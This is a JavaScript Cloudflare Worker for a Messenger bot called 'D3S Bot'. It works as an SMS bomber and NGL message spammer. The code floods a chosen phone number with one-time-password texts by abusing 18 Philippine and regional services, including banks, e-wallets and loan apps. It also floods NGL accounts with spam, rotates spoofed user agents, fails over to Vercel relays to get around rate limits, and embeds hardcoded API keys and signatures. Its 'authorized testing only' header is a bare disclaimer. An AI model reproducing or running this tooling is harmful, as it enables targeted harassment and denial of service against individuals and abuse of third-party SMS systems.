/**
 * D3S Bot — NGL + SMS Bomber + Messenger
 * v2.1 — Cloudflare → Vercel failover on both paths
 * For authorized penetration testing only.
 */

const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type',
};

const VERSION = 'bot-v2.1';
const GRAPH = 'https://graph.facebook.com/v20.0';
const VERCEL_RELAY = 'https://nglspammer2.vercel.app/api/relay';
const VERCEL_SMS   = 'https://sms-jsiej.vercel.app/api/sms';

const UA_LIST = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36',
];

function pickUA() { return UA_LIST[Math.floor(Math.random() * UA_LIST.length)]; }

function uuid() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
    const r = (Math.random() * 16) | 0;
    return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
  });
}

function json(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { ...CORS, 'Content-Type': 'application/json; charset=utf-8', 'X-Worker-Version': VERSION },
  });
}

function randHex(n) {
  let s = '';
  while (s.length < n) s += Math.floor(Math.random() * 16).toString(16);
  return s.slice(0, n);
}
function randAlpha(n) {
  const c = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let r = '';
  for (let i = 0; i < n; i++) r += c[Math.floor(Math.random() * c.length)];
  return r;
}
function randGmail() { return randAlpha(8) + '@gmail.com'; }
function randUid() { return randAlpha(28); }
function randDevice() { return randAlpha(16); }

function normPhone(p) {
  p = String(p).replace(/\s/g, '');
  if (p.startsWith('0')) return '+63' + p.slice(1);
  if (p.startsWith('63') && !p.startsWith('+63')) return '+' + p;
  if (!p.startsWith('+63') && p.length === 10) return '+63' + p;
  if (!p.startsWith('+')) return '+63' + p;
  return p;
}

async function post(url, headers, body, timeoutMs = 8000) {
  try {
    const ctrl = new AbortController();
    const to = setTimeout(() => ctrl.abort(), timeoutMs);
    const r = await fetch(url, {
      method: 'POST',
      headers: headers || {},
      body: body,
      signal: ctrl.signal,
    });
    clearTimeout(to);
    await r.text().catch(() => {});
    return { status: r.status };
  } catch (e) {
    return { status: 0, error: String(e) };
  }
}

/* ═══════════════════════════════════════════════════════════
   NGL
   ═══════════════════════════════════════════════════════════ */
async function cfDirect(username, message) {
  const nonce = Date.now() + '-' + Math.floor(Math.random() * 1e9);
  const apiUrl = 'https://ngl.link/api/submit?_=' + nonce;
  const payload = new URLSearchParams({
    username, question: message, deviceId: uuid(), gameSlug: '', referrer: '',
  }).toString();
  const h = new Headers();
  h.set('Accept', '*/*');
  h.set('Accept-Language', 'en-US,en;q=0.9');
  h.set('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
  h.set('X-Requested-With', 'XMLHttpRequest');
  h.set('Origin', 'https://ngl.link');
  h.set('Referer', 'https://ngl.link/' + username);
  h.set('User-Agent', pickUA());
  try {
    const r = await fetch(apiUrl, { method: 'POST', headers: h, body: payload });
    const text = (await r.text()).slice(0, 300);
    return { ok: r.status === 200, status: r.status, body: text, error: '', via: 'cloudflare' };
  } catch (e) {
    return { ok: false, status: 0, body: '', error: String(e), via: 'cloudflare' };
  }
}

async function vercelRelay(username, message) {
  try {
    const r = await fetch(VERCEL_RELAY, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, message }),
    });
    const j = await r.json();
    return { ok: !!j.ok, status: j.status || 0, body: j.body || '', error: j.error || '', via: 'vercel' };
  } catch (e) {
    return { ok: false, status: 0, body: '', error: String(e), via: 'vercel' };
  }
}

async function nglSend(username, message) {
  const cf = await cfDirect(username, message);
  if (cf.status === 200) return cf;
  const vc = await vercelRelay(username, message);
  if (vc.status === 200) return vc;
  return cf;
}

async function nglBatch(username, count, message) {
  const stats = { sent: 0, fof: 0, blk: 0, err: 0, via_cf: 0, via_vc: 0, start: Date.now() };
  const n = Math.min(count, 50);
  for (let i = 0; i < n; i++) {
    const r = await nglSend(username, message);
    if (r.status === 200) {
      stats.sent++;
      if (r.via === 'cloudflare') stats.via_cf++;
      else if (r.via === 'vercel') stats.via_vc++;
    }
    else if (r.status === 404) stats.fof++;
    else if (r.status === 429) stats.blk++;
    else stats.err++;
    if (i < n - 1) await new Promise(res => setTimeout(res, 200));
  }
  stats.elapsed = ((Date.now() - stats.start) / 1000).toFixed(1);
  return stats;
}

/* ═══════════════════════════════════════════════════════════
   SMS services (Cloudflare side)
   ═══════════════════════════════════════════════════════════ */

async function svcCustom(phone, sender, msg) {
  const norm = normPhone(phone);
  const suffix = '-freed0m';
  const text = msg.endsWith(suffix) ? msg : msg + ' ' + suffix;
  const cmd = JSON.stringify(['free.text.sms', '421', norm, '2207117BPG',
    'fuT8-dobSdyEFRuwiHrxiz:APA91bHNbeMP4HxJR-eBEAS0lf9fyBPg-HWWd21A9davPtqxmU-J-TTQWf28KXsWnnTnEAoriWq3TFG8Xdcp83C6GrwGka4sTd_6qnlqbfN4gP82YaTgvvg', text]);
  const body = new URLSearchParams({
    UID: randUid(), humottaee: 'Processing', Email: randGmail(),
    '$Oj0O%K7zi2j18E': cmd, device_id: randDevice(),
    Photo: 'https://lh3.googleusercontent.com/a/ACg8ocJyIdNL-vWOcm_v4Enq2PRZRcNaU_c8Xt0DJ1LNvmtKDiVQ-A=s96-c',
    Name: sender || 'User',
  }).toString();
  const r = await post('https://sms.m2techtronix.com/v13/sms.php',
    { 'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 15)', 'Content-Type': 'application/x-www-form-urlencoded' }, body);
  return r.status === 200;
}

async function svcEzloan(phone) {
  const r = await post('https://gateway.ezloancash.ph/security/auth/otp/request',
    { 'User-Agent': 'okhttp/4.9.2', 'Content-Type': 'application/json' },
    JSON.stringify({ businessId: 'EZLOAN', contactNumber: phone, appsflyerIdentifier: '1760444943092-3966994042140191452' }));
  return r.status === 200;
}

async function svcXpress(phone, batch) {
  const p = phone.startsWith('+63') ? phone : '+63' + phone.replace(/^0/, '');
  const r = await post('https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp',
    { 'User-Agent': 'Dalvik/2.1.0', 'Content-Type': 'application/json' },
    JSON.stringify({
      FirstName: 'user', LastName: 'test',
      Email: `user${Date.now()}_${batch}@gmail.com`,
      Phone: p, Password: 'Pass1234', ConfirmPassword: 'Pass1234',
      FingerprintVisitorId: 'TPt0yCuOFim3N3rzvrL1',
      FingerprintRequestId: '1757149666261.Rr1VvG',
    }));
  return r.status === 200;
}

async function svcAbenson(phone) {
  const body = new URLSearchParams({ contact_no: phone, login_token: 'undefined' }).toString();
  const r = await post('https://api.mobile.abenson.com/api/public/membership/activate_otp',
    { 'User-Agent': 'okhttp/4.9.0', 'Content-Type': 'application/x-www-form-urlencoded' }, body);
  return r.status === 200;
}

async function svcExcellent(phone) {
  const coords = [{ lat: '14.5995', long: '120.9842' }, { lat: '14.6760', long: '121.0437' }, { lat: '14.8648', long: '121.0418' }];
  const c = coords[Math.floor(Math.random() * coords.length)];
  const r = await post('https://api.excellenteralending.com/dllin/union/rehabilitation/dock',
    { 'User-Agent': 'okhttp/4.12.0', 'Content-Type': 'application/json; charset=utf-8', 'x-latitude': c.lat, 'x-longitude': c.long },
    JSON.stringify({ domain: phone, cat: 'login', previous: false, financial: 'efe35521e51f924efcad5d61d61072a9' }));
  return r.status === 200;
}

async function svcFortune(phone) {
  const p = phone.replace(/^0/, '');
  const r = await post('https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register',
    { 'User-Agent': 'Dart/3.6 (dart:io)', 'Content-Type': 'application/json', 'app-type': 'GOOGLE_PLAY', 'authorization': 'Bearer' },
    JSON.stringify({ deviceId: 'c31a9bc0-652d-11f0-88cf-9d4076456969', deviceType: 'GOOGLE_PLAY', companyId: '4bf735e97269421a80b82359e7dc2288', dialCode: '+63', phoneNumber: p }));
  return r.status === 200;
}

async function svcWemove(phone) {
  const p = phone.replace(/^0/, '');
  const r = await post('https://api.wemove.com.ph/auth/users',
    { 'User-Agent': 'okhttp/4.9.3', 'Content-Type': 'application/json', 'xuid_type': 'user', 'source': 'customer', 'authorization': 'Bearer' },
    JSON.stringify({ phone_country: '+63', phone_no: p }));
  return r.status === 200;
}

async function svcLbc(phone) {
  const p = phone.replace(/^0/, '');
  const body = new URLSearchParams({
    verification_type: 'mobile', client_email: randGmail(),
    client_contact_code: '+63', client_contact_no: p,
    app_log_uid: randHex(16),
  }).toString();
  const r = await post('https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification',
    { 'User-Agent': 'Dart/2.19 (dart:io)', 'Content-Type': 'application/x-www-form-urlencoded' }, body);
  return r.status === 200;
}

async function svcPickup(phone) {
  const p = phone.startsWith('+63') ? phone : '+63' + phone.replace(/^0/, '');
  const r = await post('https://production.api.pickup-coffee.net/v2/customers/login',
    { 'User-Agent': 'okhttp/4.12.0', 'Content-Type': 'application/json' },
    JSON.stringify({ mobile_number: p, login_method: 'mobile_number' }));
  return r.status === 200;
}

async function svcHoney(phone) {
  const r = await post('https://api.honeyloan.ph/api/client/registration/step-one',
    { 'User-Agent': 'Mozilla/5.0 (Linux; Android 15)', 'Content-Type': 'application/json' },
    JSON.stringify({ phone: phone, is_rights_block_accepted: 1 }));
  return r.status === 200;
}

async function svcKomo(phone) {
  const r = await post('https://api.komo.ph/api/otp/v5/generate',
    { 'Content-Type': 'application/json', 'Signature': 'ET/C2QyGZtmcDK60Jcavw2U+rhHtiO/HpUTT4clTiISFTIshiM58ODeZwiLWqUFo51Nr5rVQjNl6Vstr82a8PA==', 'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba' },
    JSON.stringify({ mobile: phone, transactionType: 6 }));
  return r.status === 200;
}

async function svcS5(phone) {
  const p = normPhone(phone);
  const body = new URLSearchParams({ phone_number: p }).toString();
  const r = await post('https://api.s5.com/player/api/v1/otp/request',
    { 'accept': 'application/json, text/plain, */*', 'content-type': 'multipart/form-data;', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36' }, body);
  return r.status === 200;
}

async function svcGrab(phone) {
  const p = phone.startsWith('+63') ? phone : '+63' + phone.replace(/^0/, '');
  const r = await post('https://api.grab.com/grabid/v1/phone/otp',
    { 'User-Agent': 'Grab/5.0 (Android)', 'Content-Type': 'application/json' },
    JSON.stringify({ phoneNumber: p, countryCode: 'PH', channel: 'SMS' }));
  return r.status === 200;
}

async function svcLazada(phone) {
  const p = phone.replace(/^0/, '');
  const r = await post('https://api.lazada.com.ph/rest/account/sendOtp',
    { 'User-Agent': 'Lazada/8.0 (Android)', 'Content-Type': 'application/json' },
    JSON.stringify({ mobile: p, countryCode: '63' }));
  return r.status === 200;
}

async function svcShopee(phone) {
  const p = phone.replace(/^0/, '');
  const r = await post('https://shopee.ph/api/v4/account/request_otp',
    { 'User-Agent': 'Shopee/2.0 (Android)', 'Content-Type': 'application/json' },
    JSON.stringify({ phone: p, country: 'PH' }));
  return r.status === 200;
}

async function svcPayMaya(phone) {
  const p = phone.replace(/^0/, '');
  const r = await post('https://api.paymaya.com/v2/otp/send',
    { 'User-Agent': 'PayMaya/4.0 (Android)', 'Content-Type': 'application/json' },
    JSON.stringify({ mobileNumber: p, channel: 'sms' }));
  return r.status === 200;
}

async function svcCoinsPH(phone) {
  const p = phone.replace(/^0/, '');
  const r = await post('https://api.coins.ph/v2/otp/request',
    { 'User-Agent': 'Coins.ph/3.0 (Android)', 'Content-Type': 'application/json' },
    JSON.stringify({ phone: p, type: 'login' }));
  return r.status === 200;
}

async function svcBPI(phone) {
  const p = phone.replace(/^0/, '');
  const r = await post('https://api.bpi.com.ph/otp/send',
    { 'User-Agent': 'BPI/2.0 (Android)', 'Content-Type': 'application/json' },
    JSON.stringify({ phoneNumber: p, channel: 'SMS' }));
  return r.status === 200;
}

const SMS_SERVICES = {
  'Custom SMS': svcCustom,
  'EZLoan': svcEzloan,
  'Xpress PH': svcXpress,
  'Abenson': svcAbenson,
  'Excellent Lending': svcExcellent,
  'Fortune Pay': svcFortune,
  'WeMove': svcWemove,
  'LBC Connect': svcLbc,
  'Pickup Coffee': svcPickup,
  'Honey Loan': svcHoney,
  'Komo PH': svcKomo,
  'S5.com': svcS5,
  'Grab PH': svcGrab,
  'Lazada PH': svcLazada,
  'Shopee PH': svcShopee,
  'PayMaya': svcPayMaya,
  'Coins.ph': svcCoinsPH,
  'BPI Bank': svcBPI,
};
const SMS_NAMES = Object.keys(SMS_SERVICES);

async function cfSmsBatch(phone, services, rounds, sender, msg) {
  const stats = { ok: 0, fail: 0, rounds: 0, start: Date.now(), svc: {}, via: 'cloudflare' };
  const maxRounds = Math.min(rounds, 20);
  for (const s of services) stats.svc[s] = { ok: 0, fail: 0 };
  for (let r = 0; r < maxRounds; r++) {
    const tasks = [];
    const names = [];
    for (const svc of services) {
      const fn = SMS_SERVICES[svc];
      if (!fn) continue;
      const p = (svc === 'Custom SMS') ? fn(phone, sender || 'User', msg || 'Test') :
                (svc === 'Xpress PH') ? fn(phone, r + 1) :
                fn(phone);
      tasks.push(p);
      names.push(svc);
    }
    const results = await Promise.allSettled(tasks);
    for (let i = 0; i < results.length; i++) {
      const ok = results[i].status === 'fulfilled' && results[i].value === true;
      if (ok) { stats.ok++; stats.svc[names[i]].ok++; }
      else    { stats.fail++; stats.svc[names[i]].fail++; }
    }
    stats.rounds++;
    if (r < maxRounds - 1) await new Promise(res => setTimeout(res, 1200));
  }
  stats.elapsed = ((Date.now() - stats.start) / 1000).toFixed(1);
  return stats;
}

async function vercelSmsBatch(phone, services, rounds, sender, msg) {
  try {
    const indices = services
      .map(s => SMS_NAMES.indexOf(s) + 1)
      .filter(n => n > 0);
    const r = await fetch(VERCEL_SMS, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        phone,
        services: indices,
        rounds,
        sender,
        message: msg,
      }),
    });
    const j = await r.json();
    if (j && typeof j.sent === 'number') {
      return {
        ok: j.sent || 0,
        fail: j.fail || 0,
        rounds: j.rounds || rounds,
        elapsed: j.elapsed || '0',
        svc: j.per_service || {},
        via: 'vercel',
      };
    }
  } catch (e) {}
  return null;
}

async function smsBatch(phone, services, rounds, sender, msg) {
  const cf = await cfSmsBatch(phone, services, rounds, sender, msg);
  if (cf.ok > 0) return cf;

  const vc = await vercelSmsBatch(phone, services, rounds, sender, msg);
  if (vc) return vc;

  return cf;
}

/* ═══════════════════════════════════════════════════════════
   Messenger reply
   ═══════════════════════════════════════════════════════════ */
async function reply(env, psid, text) {
  const url = `${GRAPH}/me/messages?access_token=${env.PAGE_TOKEN}`;
  const body = {
    recipient: { id: psid },
    messaging_type: 'RESPONSE',
    message: { text: text.slice(0, 1900) },
  };
  try {
    const r = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
    const txt = await r.text();
    if (!r.ok) console.error('FB reply failed', r.status, txt);
    return { ok: r.ok, status: r.status, body: txt };
  } catch (e) {
    console.error('FB reply exception', String(e));
    return { ok: false, status: 0, body: String(e) };
  }
}

/* ═══════════════════════════════════════════════════════════
   Commands
   ═══════════════════════════════════════════════════════════ */
async function handleCommand(env, psid, rawText) {
  const text = (rawText || '').trim();
  const lower = text.toLowerCase();
  const t0 = Date.now();
  if (!text) return;

  if (text === '.') {
    return reply(env, psid, '● ONLINE · ' + VERSION + ' · ' + (Date.now() - t0) + 'ms');
  }

  if (text === '..') {
    let pageName = 'unknown', pageId = 'unknown';
    try {
      const r = await fetch(`${GRAPH}/me?access_token=${env.PAGE_TOKEN}`);
      const j = await r.json();
      pageName = j.name || 'unknown';
      pageId = j.id || 'unknown';
    } catch (e) {}
    return reply(env, psid,
      '╔══════════════════════════════╗\n' +
      '║   ■ DEEP STATUS              ║\n' +
      '╚══════════════════════════════╝\n' +
      '\n' +
      '  Version     ' + VERSION + '\n' +
      '  Page        ' + pageName + '\n' +
      '  Page ID     ' + pageId + '\n' +
      '  Verify      ' + (env.VERIFY_TOKEN ? '✓ SET' : '✗ MISSING') + '\n' +
      '  Token       ' + (env.PAGE_TOKEN ? '✓ SET' : '✗ MISSING') + '\n' +
      '  App secret  ' + (env.APP_SECRET ? '✓ SET' : '✗ MISSING') + '\n' +
      '  NGL relays  cloudflare → vercel\n' +
      '  SMS relays  cloudflare → vercel\n' +
      '  SMS services  ' + SMS_NAMES.length + '\n' +
      '  Latency     ' + (Date.now() - t0) + 'ms'
    );
  }

  if (lower === 'help' || lower === '?') {
    return reply(env, psid,
      '╔══════════════════════════════╗\n' +
      '║   D3S BOT · ' + VERSION + '       ║\n' +
      '║   NGL + SMS + Messenger      ║\n' +
      '╚══════════════════════════════╝\n' +
      '\n' +
      '▸ STATUS\n' +
      '  .              quick ping\n' +
      '  ..             deep status\n' +
      '  ping           timestamp\n' +
      '  help           this menu\n' +
      '\n' +
      '▸ NGL\n' +
      '  test <user>\n' +
      '  spam <user> <count> <msg>\n' +
      '\n' +
      '▸ SMS\n' +
      '  sms <phone>            all 18 once\n' +
      '  sms <phone> <count>    loop N (max 20)\n' +
      '  smssvc <phone> <1,2,3> chosen services\n' +
      '  smshelp                services list\n' +
      '\n' +
      '▸ EXAMPLE\n' +
      '  spam tsnn_7272 20 KUPAL\n' +
      '  sms 09123456789 3\n' +
      '  smssvc 09123456789 1,3,8'
    );
  }

  if (lower === 'smshelp') {
    let out = '▸ SMS SERVICES (' + SMS_NAMES.length + ')\n\n';
    SMS_NAMES.forEach((n, i) => {
      out += '  [' + String(i + 1).padStart(2, ' ') + '] ' + n + '\n';
    });
    out += '\n  Usage:\n  sms <phone> <count>\n  smssvc <phone> 1,3,8';
    return reply(env, psid, out);
  }

  if (lower === 'ping') return reply(env, psid, '● PONG · ' + new Date().toISOString());

  if (lower.startsWith('test ')) {
    const user = text.split(/\s+/)[1];
    if (!user) return reply(env, psid, '▸ USAGE\n  test <user>');
    await reply(env, psid, '▸ TESTING NGL · ' + user);
    const t1 = Date.now();
    const r = await nglSend(user, 'bot-preflight');
    const ms = Date.now() - t1;
    if (r.status === 200) return reply(env, psid, '╔══════════════════════════════╗\n║   ✓ NGL TARGET VALID         ║\n╚══════════════════════════════╝\n\n  Target   ' + user + '\n  Relay    ' + r.via + '\n  Latency  ' + ms + 'ms');
    if (r.status === 404) return reply(env, psid, '╔══════════════════════════════╗\n║   ✗ NGL NOT FOUND            ║\n╚══════════════════════════════╝\n\n  Target   ' + user + '\n  Status   HTTP 404\n  Latency  ' + ms + 'ms');
    if (r.status === 429) return reply(env, psid, '⏳ NGL RATE LIMITED · ' + user);
    return reply(env, psid, '⚠ NGL HTTP ' + r.status + ' · ' + (r.error || ''));
  }

  if (lower.startsWith('spam ')) {
    const parts = text.split(/\s+/);
    if (parts.length < 4) return reply(env, psid, '▸ USAGE\n  spam <user> <count> <msg>');
    const user = parts[1];
    const count = parseInt(parts[2], 10);
    const message = parts.slice(3).join(' ');
    if (!user || user.includes('/')) return reply(env, psid, '▸ ERROR\n  invalid user');
    if (!count || count < 1 || count > 50) return reply(env, psid, '▸ ERROR\n  count 1–50');
    await reply(env, psid, '▶ NGL BATCH\n  Target  ' + user + '\n  Count   ' + count + '\n  Message ' + message);
    const stats = await nglBatch(user, count, message);
    const hitRate = count > 0 ? ((stats.sent / count) * 100).toFixed(1) : '0';
    return reply(env, psid,
      '■ NGL BATCH DONE\n' +
      '  Target    ' + user + '\n' +
      '  ✓ Sent    ' + stats.sent + '  (CF ' + stats.via_cf + ' / VC ' + stats.via_vc + ')\n' +
      '  4 404     ' + stats.fof + '\n' +
      '  ✗ Errors  ' + stats.err + '\n' +
      '  ⏳ Blocked ' + stats.blk + '\n' +
      '  Hit rate  ' + hitRate + '%\n' +
      '  Elapsed   ' + stats.elapsed + 's');
  }

  if (lower.startsWith('smssvc ')) {
    const parts = text.split(/\s+/);
    if (parts.length < 3) return reply(env, psid, '▸ USAGE\n  smssvc <phone> <1,2,3>');
    const phone = parts[1];
    const sel = parts[2];
    const idx = sel.split(',').map(s => parseInt(s.trim(), 10)).filter(n => n >= 1 && n <= SMS_NAMES.length);
    if (!idx.length) return reply(env, psid, '▸ ERROR\n  invalid service numbers');
    const services = idx.map(i => SMS_NAMES[i - 1]);
    await reply(env, psid, '▶ SMS SELECTED\n  Phone ' + phone + '\n  Svc   ' + services.join(', '));
    const stats = await smsBatch(phone, services, 1, 'User', 'Test');
    let out = '■ SMS DONE\n  Phone   ' + phone + '\n  ✓ Sent  ' + stats.ok + '  (' + (stats.via || 'cloudflare') + ')\n  ✗ Fail  ' + stats.fail + '\n  Elapsed ' + stats.elapsed + 's\n\n';
    for (const [n, v] of Object.entries(stats.svc)) {
      out += '  ' + (v.ok > 0 ? '✓' : '✗') + ' ' + n + '\n';
    }
    return reply(env, psid, out);
  }

  if (lower.startsWith('sms ')) {
    const parts = text.split(/\s+/);
    if (parts.length < 2) return reply(env, psid, '▸ USAGE\n  sms <phone> [count]');
    const phone = parts[1];
    const rounds = parts[2] ? Math.max(1, Math.min(20, parseInt(parts[2], 10) || 1)) : 1;
    const norm = normPhone(phone);
    if (!/^\+\d{10,15}$/.test(norm)) return reply(env, psid, '▸ ERROR\n  invalid phone number');

    await reply(env, psid,
      '▶ SMS BATCH\n' +
      '  Phone   ' + phone + '\n' +
      '  Norm    ' + norm + '\n' +
      '  Svc     ' + SMS_NAMES.length + ' services\n' +
      '  Rounds  ' + rounds);

    const stats = await smsBatch(phone, SMS_NAMES, rounds, 'User', 'Test');

    let out = '■ SMS BATCH DONE\n' +
      '  Phone    ' + phone + '\n' +
      '  Rounds   ' + stats.rounds + '\n' +
      '  ✓ Sent   ' + stats.ok + '  (' + (stats.via || 'cloudflare') + ')\n' +
      '  ✗ Fail   ' + stats.fail + '\n' +
      '  Elapsed  ' + stats.elapsed + 's\n\n' +
      '  Per service:\n';
    for (const [n, v] of Object.entries(stats.svc)) {
      out += '  ' + (v.ok > 0 ? '✓' : '✗') + ' ' + n + '  ' + v.ok + '/' + (v.ok + v.fail) + '\n';
    }
    return reply(env, psid, out);
  }

  return reply(env, psid, '▸ UNKNOWN COMMAND\n  send "help"');
}

/* ═══════════════════════════════════════════════════════════
   Router
   ═══════════════════════════════════════════════════════════ */
export default {
  async fetch(request, env, ctx) {
    try {
      const url = new URL(request.url);

      if (request.method === 'OPTIONS') {
        return new Response(null, { status: 204, headers: { ...CORS, 'X-Worker-Version': VERSION } });
      }

      if (url.pathname === '/privacy') {
        return new Response(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>Privacy Policy</title></head><body>
<h1>Privacy Policy</h1>
<p>No personal data is collected or stored. Messages are processed in real time and not retained.</p>
<p>Data routing uses the Meta Messenger Platform and Cloudflare / Vercel infrastructure providers.</p></body></html>`, {
          status: 200,
          headers: { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' }
        });
      }

      if (url.pathname === '/webhook' && request.method === 'GET') {
        const mode = url.searchParams.get('hub.mode');
        const token = url.searchParams.get('hub.verify_token');
        const challenge = url.searchParams.get('hub.challenge') || '';
        if (mode === 'subscribe' && token === env.VERIFY_TOKEN) {
          return new Response(challenge, { status: 200, headers: { 'Content-Type': 'text/plain' } });
        }
        return new Response('Forbidden', { status: 403 });
      }

      if (url.pathname === '/webhook' && request.method === 'POST') {
        const raw = await request.text();
        let data;
        try { data = JSON.parse(raw); } catch { return new Response('bad json', { status: 400 }); }
        if (data.object !== 'page') return new Response('EVENT_RECEIVED', { status: 200 });
        for (const entry of (data.entry || [])) {
          for (const m of (entry.messaging || [])) {
            const psid = m.sender && m.sender.id;
            const text = m.message && m.message.text;
            if (psid && text) ctx.waitUntil(handleCommand(env, psid, text));
          }
        }
        return new Response('EVENT_RECEIVED', { status: 200 });
      }

      if (url.pathname === '/api' && request.method === 'GET' && url.searchParams.get('diag') === '1') {
        let me = null, meErr = null;
        try {
          const r = await fetch(`${GRAPH}/me?access_token=${env.PAGE_TOKEN}`);
          me = await r.json();
        } catch (e) { meErr = String(e); }
        return json({
          ok: true, version: VERSION,
          colo: request.cf ? request.cf.colo : '?',
          country: request.cf ? request.cf.country : '?',
          has_verify_token: !!env.VERIFY_TOKEN,
          has_page_token: !!env.PAGE_TOKEN,
          has_app_secret: !!env.APP_SECRET,
          ngl_relay: VERCEL_RELAY,
          sms_relay: VERCEL_SMS,
          sms_services: SMS_NAMES.length,
          page: me, page_error: meErr, ts: Date.now(),
        });
      }

      if (url.pathname === '/test-send' && request.method === 'GET') {
        const psid = url.searchParams.get('psid');
        if (!psid) return json({ ok: false, msg: 'pass ?psid=...' }, 400);
        const r = await reply(env, psid, 'Test · ' + new Date().toISOString());
        return json(r);
      }

      if (url.pathname === '/api') {
        if (request.method !== 'POST') return json({ ok: false, msg: 'POST only' }, 405);
        let body = {};
        try {
          const ct = request.headers.get('content-type') || '';
          if (ct.includes('application/json')) body = await request.json();
          else body = Object.fromEntries(new URLSearchParams(await request.text()));
        } catch (e) {
          return json({ ok: false, msg: 'bad body', error: String(e) }, 400);
        }
        const username = String(body.username || '').trim();
        const message = String(body.message || 'Hi');
        if (!username || username.includes('/') || username.includes(' ')) {
          return json({ ok: false, msg: 'bad username' }, 400);
        }
        const r = await nglSend(username, message);
        return json(r);
      }

      return json({ ok: false, msg: 'not found' }, 404);
    } catch (outer) {
      return new Response(JSON.stringify({
        ok: false, msg: 'worker exception', error: String(outer), version: VERSION,
      }), {
        status: 500,
        headers: { ...CORS, 'Content-Type': 'application/json', 'X-Worker-Version': VERSION },
      });
    }
  },
};